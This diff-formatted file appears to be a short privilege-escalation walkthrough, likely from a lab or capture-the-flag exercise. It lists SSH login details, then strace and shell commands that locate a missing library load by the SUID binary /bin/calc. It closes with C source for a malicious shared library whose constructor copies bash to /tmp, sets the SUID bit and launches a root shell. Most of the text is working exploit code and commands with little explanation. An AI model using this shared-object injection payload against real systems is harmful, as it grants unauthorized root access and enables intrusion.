@@ -1,0 +1,22 @@
+SSH AccEsS DeTaiLs:                                                        |
+Username: user                                                    
+Password: password  
+
+[user@localhost ~]$ strace /bin/calc 2>&1 | grep -i -E "open|access|no such file"
+[user@localhost ~]$ ls -al /home
+[user@localhost ~]$ chmod +rx /home/user
+[user@localhost ~]$ mkdir /home/user/.config
+[user@localhost ~]$ cd /home/user/.config
+[user@localhost .config]$ nano libcalc.c
+
+---------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+static void x() __attribute__((constructor));
+
+void x(){
+	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+---------------------
+
